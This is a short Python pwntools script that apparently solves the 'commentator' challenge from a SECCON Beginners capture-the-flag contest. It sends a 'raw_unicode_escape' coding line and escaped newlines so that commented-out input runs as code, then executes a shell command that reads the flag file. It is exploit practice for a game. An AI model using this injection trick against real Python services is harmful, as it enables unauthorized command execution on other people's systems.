# ref. https://ctftime.org/writeup/28814

from pwn import *

io = remote("commentator.beginners.seccon.games", 4444)
# io = process(["python", "commentator.mod.py"])

commands = """
import os
os.system("cat /flag*")
"""

io.sendlineafter(b">>> ", b" coding: raw_unicode_escape")
for command in commands.split("\n"):
    io.sendlineafter(b">>> ", b"\u000a" + command.encode())
io.sendlineafter(b">>> ", b"__EOF__")
io.interactive()
